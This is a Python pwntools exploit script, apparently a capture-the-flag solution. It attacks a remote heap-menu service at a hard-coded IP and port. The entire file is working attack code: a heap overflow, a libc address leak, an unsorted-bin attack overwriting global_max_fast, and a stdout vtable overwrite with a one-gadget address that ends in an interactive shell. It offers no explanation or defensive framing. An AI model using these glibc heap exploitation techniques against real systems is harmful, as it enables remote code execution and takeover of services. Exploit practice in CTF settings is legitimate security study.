#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.8"

#port = 8888
host = "202.120.7.218"
port = 2017

r = remote(host,port)

def alloc(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def fill(idx,size,s):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(s)

def free(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def dump(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

alloc(0x80)
alloc(0x80)
alloc(0x80)
alloc(0x80)
alloc(0x1000) # 4
alloc(0x1000) # 5
fill(0,0x90,"a"*0x80+p64(0) + p64(0x121))
fill(2,2,"da")
free(1)
alloc(0x80)
dump(2)
r.recvuntil(": \n")
data = r.recvuntil("\n")[:8]
#libc =  u64(data) - 0x3c3b78
libc = u64(data) - 0x3a5678
print "libc : " + hex(libc) 
#fast_max = libc + 0x3c57f8 
fast_max = libc + 0x3a7860
fill(2,0x10,p64(0) + p64(fast_max-0x10)) #unsorted bin attack to overwrite the global_max_fast
alloc(0x80)
#magic = libc + 0xf0567  
magic = libc + 0xd6e77
#fill(3,0x90,"a"*0x80 + p64(0) + p64(0x17c1))
fill(3,0x90,"a"*0x80 + p64(0) + p64(0x1641+0x480))
fill(5,0x540+0x110+0x480,"a"*(0x540+0x480) + (p64(0) + p64(0x21))*0x11) #overwrite the vtable of stdout
fill(4,0x80,p64(magic)*0x10)
free(4)
r.interactive()
